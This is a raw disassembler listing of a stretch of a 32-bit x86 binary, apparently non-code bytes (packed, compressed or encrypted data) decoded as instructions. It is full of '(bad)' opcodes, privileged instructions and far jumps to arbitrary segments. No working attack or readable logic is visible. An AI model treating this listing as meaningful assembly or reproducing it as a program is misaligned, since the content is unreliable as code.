  426182:	add    edi,DWORD PTR [ebp+ebp*8-0x7aee41d1]
  426189:	adc    BYTE PTR [eax+ebx*4+0x53],0x28
  42618e:	ret    0x3d97
  426191:	jge    0x4261ab
  426193:	mov    edx,0x9eca9679
  426198:	std    
  426199:	fistp  DWORD PTR [ecx-0x4e29f31d]
  42619f:	xor    BYTE PTR [ebp+0x49],ch
  4261a2:	inc    ecx
  4261a3:	lock loop 0x4261a9
  4261a6:	adc    al,0xf8
  4261a8:	mov    al,ds:0x65d10d5d
  4261ad:	scas   al,BYTE PTR es:[edi]
  4261ae:	sar    BYTE PTR [ebp-0x41],cl
  4261b1:	mov    cl,0xb
  4261b3:	add    eax,0xe32ba48a
  4261b8:	cli    
  4261b9:	dec    edx
  4261ba:	mov    eax,0x593662cd
  4261bf:	int    0xd2
  4261c1:	gs not edx
  4261c4:	pop    edi
  4261c5:	call   0x5691:0xe6be524a
  4261cc:	daa    
  4261cd:	jmp    0x9312:0x582cdd66
  4261d4:	jmp    0x426205
  4261d6:	leave  
  4261d7:	xor    edx,ebx
  4261d9:	pop    ds
  4261da:	xchg   edx,eax
  4261db:	daa    
  4261dc:	hlt    
  4261dd:	jb     0x4261b1
  4261df:	xchg   BYTE PTR [ecx-0x3],bl
  4261e2:	cmc    
  4261e3:	gs icebp 
  4261e5:	mov    DWORD PTR [esi],edx
  4261e7:	retf   
  4261e8:	adc    esp,ebx
  4261ea:	cdq    
  4261eb:	mov    bl,0x11
  4261ed:	cmp    al,0x0
	...
  426253:	add    BYTE PTR [eax],al
  426255:	add    BYTE PTR [ebx-0x409ef0df],bl
  42625b:	outs   dx,DWORD PTR ds:[esi]
  42625c:	(bad)  
  42625d:	sti    
  42625e:	mov    bh,0x83
  426260:	mov    cl,0x27
  426262:	arpl   WORD PTR [edx],bx
  426264:	sub    ebx,edi
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	pop    ecx
  42626f:	xor    ecx,esp
  426271:	push   edi
  426272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426273:	cmp    BYTE PTR [edx-0xc7dcd79],dl
  426279:	retf   
  42627a:	sbb    DWORD PTR [edi],0x270cf285
  426280:	lods   eax,DWORD PTR ds:[esi]
  426281:	mov    edx,0xdd73ca4e
  426286:	sub    BYTE PTR [edi],dl
  426288:	xchg   ebx,eax
  426289:	psubw  mm0,QWORD PTR [edx+0x175731ea]
  426290:	xchg   ebx,eax
  426291:	pop    edi
  426292:	sbb    DWORD PTR [ebp+0x21],ebx
  426295:	sub    eax,0x5f376e23
  42629a:	stc    
  42629b:	cmp    BYTE PTR [edx],ah
  42629d:	mov    ?,WORD PTR [ebx+0x2b]
  4262a0:	jnp    0x4262cd
  4262a2:	add    al,bl
  4262a4:	aad    0x6f
  4262a6:	out    0xa2,al
  4262a8:	div    esp
  4262aa:	cld    
  4262ab:	pop    ds
  4262ac:	not    BYTE PTR [eax-0x52]
  4262af:	ficom  DWORD PTR [edi-0x21fa9cfb]
  4262b5:	icebp  
  4262b6:	into   
  4262b7:	xchg   ebx,eax
  4262b8:	fistp  WORD PTR [ebp+0x8]
  4262bb:	imul   edi,DWORD PTR [esi+0x7],0x26063427
  4262c2:	sbb    al,0xb4
  4262c4:	(bad)  
  4262c6:	mov    esi,0xd4ea236
  4262cb:	sub    DWORD PTR [edx+edi*8+0x4b],eax
  4262cf:	push   esi
  4262d0:	(bad)  
  4262d1:	cli    
  4262d2:	sti    
  4262d3:	add    ebp,DWORD PTR [esi+0xd]
  4262d6:	arpl   WORD PTR [edi-0x6bbddcc7],sp
  4262dc:	add    eax,0xfe4ebe76
  4262e1:	loopne 0x42630d
  4262e3:	xor    al,0x46
  4262e5:	ins    BYTE PTR es:[edi],dx
  4262e6:	mov    eax,ds:0x833d9ce1
  4262eb:	or     eax,eax
  4262ed:	test   BYTE PTR [edx+esi*1+0x7],cl
  4262f1:	jns    0x42630a
  4262f3:	shl    DWORD PTR [eax+ebp*2],cl
  4262f6:	cmp    BYTE PTR [esi],cl
  4262f8:	cmp    dl,BYTE PTR [esi]
  4262fa:	sbb    DWORD PTR [ebx+eiz*1-0x13d1e698],0x38
  426302:	dec    edi
  426303:	dec    edi
  426304:	sub    eax,0x200f124f
  426309:	mov    eax,ds:0x2d47645c
  42630e:	enter  0x763b,0xc7
  426312:	or     BYTE PTR [edi+0x16bbd02a],bl
  426318:	(bad)  
  426319:	sbb    edi,edi
  42631b:	fcom   QWORD PTR [ecx-0x11]
  42631e:	enter  0x2d18,0xcd
  426322:	xlat   BYTE PTR ds:[ebx]
  426323:	mov    eax,ds:0xab8c3b74
  426328:	scas   al,BYTE PTR es:[edi]
  426329:	cli    
  42632a:	mov    ds:0xc96d85d1,eax
  42632f:	gs xchg esp,eax
  426331:	(bad)  
  426335:	dec    ebx
  426336:	dec    ecx
  426337:	push   esi
  426338:	sub    esi,ebx
  42633a:	ds clc 
  42633c:	ins    BYTE PTR es:[edi],dx
  42633d:	test   eax,0x85be5117
  426342:	mov    edi,0x890bf942
  426347:	gs jbe 0x4263c4
  42634a:	sti    
  42634b:	repz push edx
  42634d:	jnp    0x42637e
  42634f:	cmp    eax,0xab544e51
  426354:	pop    ecx
  426355:	adc    eax,0xaba9ad29
  42635a:	pop    ebx
  42635b:	dec    ebx
  42635c:	add    esi,0xbf5f18ce
  426362:	ja     0x4263a3
  426364:	sub    BYTE PTR [edi+0x4c],ch
  426367:	dec    esi
  426368:	call   0xee:0xa57a20a9
	...
  4263d3:	add    BYTE PTR [eax],al
  4263d5:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4263d9:	dec    esi
  4263da:	std    
  4263db:	out    dx,al
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x91e013ab
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	xchg   DWORD PTR [edi],ecx
  4263f0:	call   0xa59c:0x4062563a
  4263f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263f8:	in     eax,dx
  4263f9:	test   BYTE PTR [edi],dl
  4263fb:	add    eax,ebp
  4263fd:	and    al,0xbd
  4263ff:	inc    esp
  426400:	jle    0x426452
  426402:	xor    edx,DWORD PTR [ecx]
  426404:	fdivr  DWORD PTR [ebx]
  426406:	(bad)  
  426408:	out    0x43,eax
  42640a:	sub    dl,BYTE PTR [ebx+eiz*8-0x4b]
  42640e:	pop    ebp
  42640f:	mov    ebx,eax
  426411:	push   edx
  426413:	cmp    al,0x0
  426415:	sbb    bl,bh
  426417:	ret    0xf9e2
  42641a:	test   DWORD PTR [eax+0x21],edx
  42641d:	sub    eax,0x147f8a09
  426422:	add    eax,0x9145ef52
  426427:	mov    al,ds:0x3aa7c708
  42642c:	leave  
  42642d:	cmp    eax,0x2e5450bb
  426432:	xlat   BYTE PTR ds:[ebx]
  426433:	sbb    al,0x1
  426435:	sub    BYTE PTR [ecx+0xe7a4e8c],bl
  42643b:	mov    eax,0xfd8aca2a
  426440:	push   edx
  426441:	int    0xe3
  426443:	aad    0xee
  426445:	mov    ch,0xc1
  426447:	pop    edx
  426448:	pushf  
  426449:	dec    esp
  42644a:	pop    es
  42644b:	(bad)  
  42644c:	jmp    0x4f8c:0x1d50b03d
  426453:	stos   BYTE PTR es:[edi],al
  426454:	retf   0x633b
  426457:	mov    esi,0x28354537
  42645c:	out    0x4d,eax
  42645e:	dec    edi
  42645f:	shl    BYTE PTR [edx+0x6e1dee61],1
  426465:	sub    ecx,DWORD PTR [ebx+esi*2]
  426468:	dec    ebx
  426469:	xor    al,0x49
  42646b:	(bad)  
  42646c:	(bad)  
  42646d:	loopne 0x426444
  42646f:	add    esi,DWORD PTR ds:0xc3d67bdc
  426475:	stc    
  426476:	add    DWORD PTR [ecx+0x76c26673],ecx
  42647c:	mov    WORD PTR [eax],gs
  42647e:	cld    
  42647f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426481:	outs   dx,DWORD PTR ds:[esi]
  426482:	xchg   DWORD PTR [ebx-0x6d343832],edx
  426488:	mov    DWORD PTR [eax+0x4e3e093e],ebp
  42648e:	lods   eax,DWORD PTR ds:[esi]
  42648f:	sti    
  426490:	add    DWORD PTR [esi+eax*1],0xffffffa3
  426494:	xchg   ebp,eax
  426495:	pop    ecx
  426496:	push   edx
  426497:	adc    esi,edi
  426499:	in     eax,dx
  42649a:	add    DWORD PTR [ecx+0x54],esp
  42649d:	rcr    DWORD PTR [eax],0xf1
  4264a0:	outs   dx,BYTE PTR ds:[esi]
  4264a1:	add    al,0x83
  4264a3:	dec    esi
  4264a4:	push   0xe43c6e01
  4264a9:	jo     0x426525
  4264ab:	call   0xc8c46eda
  4264b0:	dec    edx
  4264b1:	inc    edx
  4264b2:	adc    al,0xf3
  4264b4:	mov    bl,0x9b
  4264b6:	sub    eax,0xea196c1d
  4264bc:	jl     0x42649e
  4264be:	shl    DWORD PTR [edi],0xca
  4264c1:	fsub   st(0),st
  4264c3:	imul   eax,DWORD PTR [ecx],0x96b78c25
  4264c9:	shl    dh,0x9b
  4264cc:	popf   
  4264cd:	push   ds
  4264ce:	out    dx,al
  4264cf:	lds    eax,FWORD PTR [edx]
  4264d1:	push   ecx
  4264d2:	in     al,0x97
  4264d4:	mov    esi,0x1de45eee
  4264d9:	sbb    BYTE PTR [eax-0x72224ea1],0x33
  4264e0:	cs std 
  4264e2:	test   dl,ch
  4264e4:	fbstp  TBYTE PTR [esi+eiz*1]
  4264e7:	jo     0x4264d5
  4264e9:	jmp    0x8444ffe3
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx+0x71867685]
  426565:	das    
  426566:	addr16 fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	cs pusha 
  426570:	sub    eax,0x40f5250d
  426575:	push   edi
  426576:	popa   
  426577:	test   BYTE PTR [ecx],cl
  426579:	pop    ecx
  42657a:	inc    ebp
  42657b:	gs sbb ebp,DWORD PTR fs:[ebx]
  42657f:	push   ss
  426580:	nop
  426581:	cmp    eax,0xfa6aff34
  426586:	cmp    BYTE PTR [ebx],dl
  426588:	add    DWORD PTR [edi+0x11f7a50],ecx
  42658e:	push   edi
  42658f:	int    0xca
  426591:	stc    
  426592:	add    al,0x1c
  426594:	cmp    al,BYTE PTR [edx+0x53042606]
  42659a:	cmp    DWORD PTR [eax-0x2ffbd270],ebx
  4265a0:	lea    ecx,[ebp+edx*4-0x692b59c9]
  4265a7:	push   ds
  4265a8:	sub    BYTE PTR [edx],al
  4265aa:	call   0x1feab89d
  4265af:	shl    edx,0x9d
  4265b2:	fadd   DWORD PTR [edi]
  4265b4:	(bad)  
  4265b6:	(bad)  
  4265b7:	shl    BYTE PTR [eax+0x6a6e44dd],cl
  4265bd:	mov    ebx,0x3ca5dec8
  4265c2:	adc    al,0x6d
  4265c4:	cld    
  4265c5:	bound  esi,QWORD PTR [ecx+0x2288ebf9]
  4265cb:	sbb    eax,0x51c49ca8
  4265d0:	loope  0x4265fe
  4265d2:	xor    eax,0xc6ad366e
  4265d7:	in     al,dx
  4265d8:	cmp    ch,BYTE PTR [edi+0x2493fee3]
  4265de:	cmp    DWORD PTR [ecx+ebx*8-0x6b],ebx
  4265e2:	pop    ebx
  4265e3:	dec    edi
  4265e4:	sub    eax,0x9bc30bff
  4265e9:	loope  0x426651
  4265eb:	mov    esp,0xdcb300bd
  4265f0:	inc    eax
  4265f1:	push   esi
  4265f2:	ret    
  4265f3:	iret   
  4265f4:	in     eax,0x2f
  4265f6:	push   ecx
  4265f7:	sbb    BYTE PTR [ebx-0x34],bh
  4265fa:	test   ch,al
  4265fc:	test   DWORD PTR [ecx+0x59],esi
  4265ff:	scas   eax,DWORD PTR es:[edi]
  426600:	stos   BYTE PTR es:[edi],al
  426601:	popa   
  426602:	sbb    al,0xff
  426604:	xlat   BYTE PTR ds:[ebx]
  426605:	loopne 0x42658f
  426607:	clc    
  426608:	ins    BYTE PTR es:[edi],dx
  426609:	mov    ebp,0xa56fb5ba
  42660e:	hlt    
  42660f:	out    dx,al
  426610:	jge    0x42662a
  426612:	iret   
  426613:	outs   dx,DWORD PTR ds:[esi]
  426614:	mov    ebx,0x5b16ae5e
  426619:	or     bh,BYTE PTR [eax-0x26]
  42661c:	fst    DWORD PTR [eax-0x6e52e457]
  426622:	fbstp  TBYTE PTR [esi+0x24]
  426625:	bnd data16 ja 0x4265de
  426629:	sbb    DWORD PTR [esi],esp
  42662b:	shl    BYTE PTR [ecx],0x34
  42662e:	ins    BYTE PTR es:[edi],dx
  42662f:	ds int3 
  426631:	rcr    ah,0xf5
  426634:	sub    ch,BYTE PTR [edi]
  426636:	sahf   
  426637:	sub    eax,0x17cb6704
  42663c:	push   ebp
  42663d:	(bad)  
  42663e:	es aas 
  426640:	cdq    
  426641:	inc    ebx
  426642:	in     eax,0x9d
  426644:	xchg   esi,eax
  426645:	mov    al,ds:0x2beb8fce
  42664a:	mov    WORD PTR [ebp-0x6bbef75a],fs
  426650:	pop    es
  426651:	cs jle 0x4265f8
  426654:	out    0xf8,al
  426656:	mov    esp,0x798baddc
  42665b:	cmp    dh,BYTE PTR ds:[eax*2+0x4ccd303d]
  426663:	stos   BYTE PTR es:[edi],al
  426664:	aam    0x3b
  426666:	xchg   ecx,eax
  426667:	sub    al,0x41
  426669:	inc    ebp
  42666a:	or     edx,ebx
  42666c:	enter  0x99,0x0
	...
  4266d4:	add    BYTE PTR [eax],al
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0x34156da4]
  4266e4:	rol    BYTE PTR [edx+0x67],0x9c
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	xlat   BYTE PTR ds:[ebx]
  4266ef:	fistp  QWORD PTR [ebx+0x25]
  4266f2:	scas   eax,DWORD PTR es:[edi]
  4266f3:	(bad)  
  4266f4:	sar    DWORD PTR [edx-0x23],0xad
  4266f8:	xor    eax,0x5c8115d9
  4266fd:	or     al,0x40
  4266ff:	or     DWORD PTR [esi+0x7a4d76b1],edi
  426705:	stos   DWORD PTR es:[edi],eax
  426706:	pop    edx
  426707:	jp     0x42672b
  426709:	sub    DWORD PTR [eax-0x7],esi
  42670c:	push   ebp
  42670d:	pop    edi
  42670e:	loopne 0x42678c
  426710:	push   esi
  426711:	mov    edx,esp
  426713:	fcmovnbe st,st(0)
  426715:	mov    eax,0x212950aa
  42671a:	aad    0x8c
  42671c:	(bad)  
  42671d:	imul   eax,DWORD PTR [ebx-0x34],0x500fdb63
  426724:	pop    edi
  426725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426726:	or     BYTE PTR [esi-0x62],bh
  426729:	mov    ecx,0xa9c89c64
  42672e:	ins    BYTE PTR es:[edi],dx
  42672f:	scas   eax,DWORD PTR es:[edi]
  426730:	sahf   
  426731:	push   ecx
  426732:	mov    ds:0x3e04c0e9,al
  426737:	aad    0x63
  426739:	int3   
  42673a:	lods   eax,DWORD PTR ds:[esi]
  42673b:	push   esi
  42673c:	repnz mov al,0x67
  42673f:	push   ds
  426740:	cmp    al,0xad
  426742:	scas   eax,DWORD PTR es:[edi]
  426743:	mov    ah,0x80
  426745:	scas   al,BYTE PTR es:[edi]
  426746:	sbb    eax,0x179f9c48
  42674b:	cli    
  42674c:	add    BYTE PTR [ecx-0x27],cl
  42674f:	or     ch,dl
  426751:	sbb    bl,cl
  426753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426754:	retf   0xd325
  426757:	in     al,0xa7
  426759:	(bad)  [edx-0x1c]
  42675c:	pop    ss
  42675d:	inc    esp
  42675e:	push   ebp
  42675f:	mov    edx,0x9b51497b
  426764:	pusha  
  426765:	test   eax,0x9761bdfb
  42676a:	fisubr DWORD PTR [edi]
  42676c:	rcr    DWORD PTR [ecx+0xe0e76d3],cl
  426772:	push   ss
  426773:	and    ecx,ecx
  426775:	mov    edi,0x11204b48
  42677a:	fs dec ebx
  42677c:	xchg   BYTE PTR [ebx+ecx*1],ch
  42677f:	xor    esp,ebx
  426781:	sbb    BYTE PTR [ebx+edx*1-0x43],ah
  426785:	pop    ss
  426786:	int    0xee
  426788:	mov    eax,ds:0x287354e2
  42678d:	dec    esi
  42678e:	or     al,0x8e
  426790:	cmp    eax,0x113b0af
  426795:	je     0x4267f3
  426797:	pop    ebx
  426798:	imul   ebx,ecx,0x61541cd3
  42679e:	ret    
  42679f:	int3   
  4267a0:	stc    
  4267a1:	imul   DWORD PTR [edi]
  4267a3:	mov    ecx,0xd98631f7
  4267a8:	addr16 push ebx
  4267aa:	inc    edi
  4267ab:	sbb    bh,ch
  4267ad:	ins    BYTE PTR es:[edi],dx
  4267ae:	stos   BYTE PTR es:[edi],al
  4267af:	idiv   BYTE PTR [eax+edx*4-0x3d69be79]
  4267b6:	loope  0x4267a9
  4267b8:	push   ds
  4267b9:	(bad)  
  4267ba:	lds    ebx,FWORD PTR [eax+0x4ee9fab8]
  4267c0:	stos   DWORD PTR es:[edi],eax
  4267c1:	and    DWORD PTR [edx],0x24
  4267c4:	adc    cl,dh
  4267c6:	xchg   ebp,eax
  4267c7:	jae    0x426808
  4267c9:	fstp   TBYTE PTR [edx+eax*4-0x6ccfc922]
  4267d0:	sbb    BYTE PTR [ebp+esi*8+0x7785d587],dl
  4267d7:	mov    eax,ds:0x2eae6c44
  4267dc:	pop    edx
  4267dd:	lods   eax,DWORD PTR ds:[esi]
  4267de:	in     al,0x8
  4267e0:	add    BYTE PTR [eax],0xa8
  4267e3:	xchg   ecx,eax
  4267e4:	sbb    DWORD PTR [edi+ebx*4],0xacb6fd94
  4267eb:	sub    esi,esp
  4267ed:	and    al,0x0
	...
  426853:	add    BYTE PTR [eax],al
  426855:	add    BYTE PTR [eax-0xd53173],bh
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	jmp    0x19d:0x6727e1a6
  426869:	add    BYTE PTR [eax],al
  42686b:	add    DWORD PTR [eax],eax
  42686d:	add    BYTE PTR [ebx-0x49],cl
  426870:	(bad)
  426874:	cmp    ah,bl
  426876:	lea    esp,[eax]
  426878:	psubusb mm7,mm3
  42687b:	dec    esp
  42687c:	jmp    0x91e59b21
  426881:	mov    esi,0xb2a890c2
  426886:	mov    ds:0x9e7168ea,al
  42688b:	cli    
  42688c:	ret    
  42688d:	sbb    edx,DWORD PTR ds:0xaf18f0c4
  426893:	sub    esp,ebp
  426895:	jns    0x426832
  426897:	aad    0x5b
  426899:	rol    DWORD PTR [esi+0x7a],0x36
  42689d:	aam    0x93
  42689f:	push   0xb
  4268a1:	out    0xcb,al
  4268a3:	sub    DWORD PTR [edx-0x6e],ebp
  4268a6:	in     eax,0x4b
  4268a8:	clc    
  4268a9:	sub    ch,BYTE PTR [esi*8-0x5123baa4]
  4268b0:	pop    ss
  4268b1:	bound  edi,QWORD PTR [ebx+0x3d]
  4268b4:	inc    eax
  4268b5:	add    esp,DWORD PTR [edi-0x7dd53bd6]
  4268bb:	loop   0x426916
  4268bd:	or     al,0x58
  4268bf:	leave  
  4268c0:	adc    al,0xd8
  4268c2:	mov    ds:0x8262e729,al
  4268c7:	cmp    eax,0xd4d6f5f4
  4268cc:	(bad)  
  4268cd:	jbe    0x42688b
  4268cf:	sbb    edx,DWORD PTR [ebx-0x47bf81ed]
  4268d5:	ja     0x42685f
  4268d7:	xchg   ebx,eax
  4268d8:	mov    esi,0xa9fa2b2b
  4268dd:	(bad)  
  4268de:	or     DWORD PTR [edi+0xc15b20a],edi
  4268e4:	mov    ds:0x5cc2e1a5,al
  4268e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268ea:	and    ecx,DWORD PTR [edi+ebx*2+0x3828f5da]
  4268f1:	sti    
  4268f2:	jo     0x426926
  4268f4:	(bad)  
  4268f6:	mov    BYTE PTR [ebx-0x12],dh
  4268f9:	add    bl,ch
  4268fb:	cmc    
  4268fc:	clc    
  4268fd:	jmp    ebp
  4268ff:	jo     0x426886
  426901:	fs loopne 0x426913
  426904:	mov    cl,0x36
  426906:	lods   eax,DWORD PTR ds:[esi]
  426907:	sbb    ch,BYTE PTR [edx+eax*2+0x76]
  42690b:	xchg   ebx,eax
  42690c:	fnsave [ebp+eax*2+0x6]
  426910:	test   ah,bl
  426912:	and    al,0xe2
  426914:	pop    esi
  426915:	bound  ecx,QWORD PTR [ebx-0x52]
  426918:	or     al,0xf7
  42691a:	(bad)  
  42691b:	adc    ch,BYTE PTR [ecx]
  42691d:	fisub  DWORD PTR [esi+0x79]
  426920:	shr    BYTE PTR [edx+0x22],0xfa
  426924:	cli    
  426925:	int3   
  426926:	xchg   bp,ax
  426928:	jl     0x426900
  42692a:	daa    
  42692b:	out    dx,al
  42692c:	imul   ecx,DWORD PTR [ecx+0x1a],0xffffffb7
  426930:	mov    WORD PTR [esi],ds
  426932:	dec    ecx
  426933:	(bad)  
  426934:	loopne 0x426953
  426936:	jno    0x42697e
  426938:	sbb    DWORD PTR [esi],ebp
  42693a:	pop    dx
  42693c:	int3   
  42693d:	xlat   BYTE PTR ds:[ebx]
  42693e:	xor    DWORD PTR [eax+0x7c8d0d8],0x34
  426945:	ja     0x4269c5
  426947:	add    al,0x3b
  426949:	xchg   DWORD PTR ds:0x73a41a95,edx
  42694f:	std    
  426950:	and    eax,0xf5c9cdff
  426955:	out    dx,al
  426956:	and    eax,0xf04b49a7
  42695b:	lock ret 0xa26b
  42695f:	sub    eax,0xf0a11ac5
  426964:	lods   eax,DWORD PTR ds:[esi]
  426965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426966:	pop    edi
  426967:	das    
  426968:	xchg   DWORD PTR [ebp+0x1602bbdc],eax
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    eax,DWORD PTR [ebx+0x671b1762]
  4269e7:	sahf   
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	aaa    
  4269ef:	retf   
  4269f0:	cwde   
  4269f1:	out    0xe9,al
  4269f3:	push   ebp
  4269f4:	inc    edi
  4269f5:	xchg   ecx,eax
  4269f6:	es jmp 0x4838:0x4455576f
  4269fe:	(bad)  
  4269ff:	out    0xd,al
  426a01:	mov    al,ds:0x5fc84309
  426a06:	cld    
  426a07:	repz in eax,dx
  426a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a0a:	mov    bh,0x7
  426a0c:	inc    ebx
  426a0d:	pop    edx
  426a0e:	call   0x78cb:0xa37d4a0d
  426a15:	mov    dh,0x78
  426a17:	xor    eax,0xc76999d3
  426a1c:	pusha  
  426a1d:	retf   0xfbc2
  426a20:	xchg   esi,eax
  426a21:	mov    cs,WORD PTR [edi+0x19]
  426a24:	xchg   BYTE PTR [ecx+edx*1-0x1],bh
  426a28:	inc    ebp
  426a29:	jmp    0x6b5b2fd2
  426a2e:	pop    ss
  426a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a30:	jno    0x4269e2
  426a32:	mov    ebx,0xcec34b6e
  426a37:	xchg   esp,eax
  426a38:	xlat   BYTE PTR ds:[ebx]
  426a39:	mov    bl,0xe9
  426a3b:	mov    ebx,0x471538a8
  426a40:	jle    0x426a57
  426a42:	add    ch,BYTE PTR [ecx+0x6739af36]
  426a48:	(bad)  
  426a49:	mov    dh,0xd9
  426a4b:	cmc    
  426a4c:	fist   DWORD PTR [eax+ecx*4-0x30]
  426a50:	fs and eax,0x61edd877
  426a56:	mov    ebp,0x9615bdb2
  426a5b:	idiv   DWORD PTR [ecx+0x71]
  426a5e:	(bad)  
  426a5f:	iret   
  426a60:	jb     0x426a33
  426a62:	mov    edx,0xf52a2e9c
  426a67:	stos   BYTE PTR es:[edi],al
  426a68:	hlt    
  426a69:	(bad)  
  426a6a:	xor    esi,ebx
  426a6c:	mov    bl,0x88
  426a6e:	mov    ch,0xeb
  426a70:	push   ebx
  426a71:	mov    ebp,0x3db97a85
  426a76:	pop    edx
  426a77:	dec    ecx
  426a78:	imul   edi,DWORD PTR ds:0x405a9da2,0x5
  426a7f:	call   0x8184:0xeb406a46
  426a86:	(bad)  
  426a88:	mov    bl,0x62
  426a8a:	test   eax,0xc3b34ec4
  426a8f:	jne    0x426aa6
  426a91:	outs   dx,BYTE PTR ds:[esi]
  426a92:	(bad)  
  426a93:	int    0x8d
  426a95:	(bad)  
  426a96:	aaa    
  426a97:	mov    eax,0x6acd4f9e
  426a9c:	call   0x56764eef
  426aa1:	cwde   
  426aa2:	data16 cli 
  426aa4:	retf   0x30d6
  426aa7:	lmsw   WORD PTR [ecx]
  426aaa:	mov    eax,0x3a1dece6
  426aaf:	(bad)  
  426ab0:	imul   ebx,DWORD PTR [edx+0x2f40a986],0x1822433f
  426aba:	outs   dx,BYTE PTR ds:[esi]
  426abb:	push   0xffffffbc
  426abd:	push   ebp
  426abe:	or     bh,BYTE PTR [eax]
  426ac0:	jp     0x426b2d
  426ac2:	push   esp
  426ac3:	fs sti 
  426ac5:	cmp    DWORD PTR [edi+0x681e85dd],ebx
  426acb:	sbb    DWORD PTR [esi],ebx
  426acd:	cmp    bl,0x51
  426ad0:	push   eax
  426ad2:	int    0x1e
  426ad4:	out    dx,al
  426ad5:	ins    BYTE PTR es:[edi],dx
  426ad6:	xchg   ebp,eax
  426ad7:	cs sbb eax,0x54c78463
  426add:	clc    
  426ade:	mov    ebp,0xc04b9d5b
  426ae3:	in     eax,dx
  426ae4:	mov    cl,0x21
  426ae6:	inc    esi
  426ae7:	mov    ebp,0xbda2391e
  426aec:	rol    DWORD PTR [edx+0x0],cl
	...
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x71
  426b63:	dec    esi
  426b64:	mov    eax,ds:0x19f6744
  426b69:	add    BYTE PTR [eax],al
  426b6b:	add    DWORD PTR [eax],eax
  426b6d:	add    al,bl
  426b6f:	mov    ds:0xb94a8c66,eax
  426b74:	mov    esp,DWORD PTR [esi+eiz*1+0x32]
  426b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b79:	mov    esi,0x9b1a586e
  426b7e:	and    BYTE PTR [eax+0x74db7577],al
  426b84:	ins    BYTE PTR es:[edi],dx
  426b85:	mov    ah,0xc1
  426b87:	int    0x31
  426b89:	xor    eax,0x84c8201e
  426b8e:	loopne 0x426b36
  426b90:	std    
  426b91:	mov    ecx,0x9798f0ef
  426b96:	xchg   edi,eax
  426b97:	dec    esp
  426b98:	cli    
  426b99:	sar    DWORD PTR [esi+0x647e2750],1
  426b9f:	and    ch,ch
  426ba1:	xchg   ecx,eax
  426ba2:	jge    0x426bd2
  426ba4:	shl    BYTE PTR [ecx+0xa8e7f71],0xea
  426bab:	push   esp
  426bac:	sbb    eax,DWORD PTR [edx]
  426bae:	icebp  
  426baf:	jmp    0x314c513f
  426bb4:	fwait
  426bb5:	pop    ebp
  426bb6:	inc    ebp
  426bb7:	les    edx,FWORD PTR [ebp+0x51]
  426bba:	sub    BYTE PTR [esi],ah
  426bbc:	push   cs
  426bbd:	out    0x2f,al
  426bbf:	pushf  
  426bc0:	and    al,0x9b
  426bc2:	aaa    
  426bc3:	jl     0x426b58
  426bc5:	cld    
  426bc6:	pop    esi
  426bc7:	pop    eax
  426bc8:	mov    esp,0x8499c7b
  426bcd:	add    DWORD PTR [ebx],esp
  426bcf:	cmp    BYTE PTR [edi],al
  426bd1:	push   cs
  426bd2:	sub    DWORD PTR [esi],esi
  426bd4:	add    eax,0x5cf04678
  426bd9:	mov    ds:0xea740cc5,eax
  426bde:	inc    BYTE PTR [eax-0x5e7afc1]
  426be4:	repz fistp WORD PTR [ecx+0x14]
  426be8:	popa   
  426be9:	pop    ecx
  426bea:	add    eax,0xf19cf824
  426bef:	sbb    edx,DWORD PTR [esi+0x2d]
  426bf2:	loopne 0x426c66
  426bf4:	es retf 
  426bf6:	les    esp,FWORD PTR es:[ebp-0x28]
  426bfa:	mov    ecx,0x98faeb2c
  426bff:	sbb    eax,0x2a6f0448
  426c04:	inc    ebp
  426c05:	in     al,dx
  426c06:	sbb    edi,DWORD PTR [eax-0x5]
  426c09:	dec    ebp
  426c0a:	test   BYTE PTR [ecx-0x40],al
  426c0d:	jge    0x426c6a
  426c0f:	cmp    edi,edi
  426c11:	mov    es,WORD PTR [bp+di]
  426c14:	repz mov dl,0xc9
  426c17:	imul   edx,eax,0xee398898
  426c1d:	adc    BYTE PTR [esi],bl
  426c1f:	icebp  
  426c20:	clc    
  426c21:	test   al,0xdc
  426c23:	dec    ecx
  426c24:	add    eax,DWORD PTR [esi-0x4c]
  426c27:	js     0x426c8f
  426c29:	repnz lods al,BYTE PTR ds:[esi]
  426c2b:	bnd jle 0x426c0b
  426c2e:	pop    ebx
